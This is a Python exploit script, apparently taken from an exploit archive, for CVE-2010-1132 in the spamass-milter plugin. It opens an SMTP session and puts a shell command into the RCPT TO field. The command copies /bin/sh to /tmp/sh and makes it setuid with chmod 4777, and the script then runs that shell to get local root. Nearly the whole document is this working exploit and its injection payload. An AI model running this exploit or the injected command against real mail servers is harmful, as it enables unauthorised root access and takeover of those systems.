#!/usr/bin/python

# Apache Spamassassin Milter Plugin - Local Root Command Execution (Python)
# Exploit Author: feci
# Software Link: [download link if available]
# Version: From spamass-milter-0.3.1 (-latest)
# Tested on: ubuntu
# CVE : 2010-1132

import socket
import sys
import os

if len(sys.argv) != 2:
        print "Usage	: python own-exploit.py <host>"
        print "Example	: python own-exploit.py localhost"
        sys.exit(0)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c=s.connect(('127.0.0.1', 25))
banners=s.recv(1024)
print banners
s.send('EHLO ' + sys.argv[1] + "\r\n")
s.recv(1024)
s.send('mail from: me@localhost.com'+"\r\n")
s.recv(1024)
s.send('rcpt to: root+:"|cp /bin/sh /tmp/sh;chmod 4777 /tmp/sh"' + "\r\n")
result=s.recv(1024)
print result
try:
	os.system("/tmp/sh");
except:
	s.close()
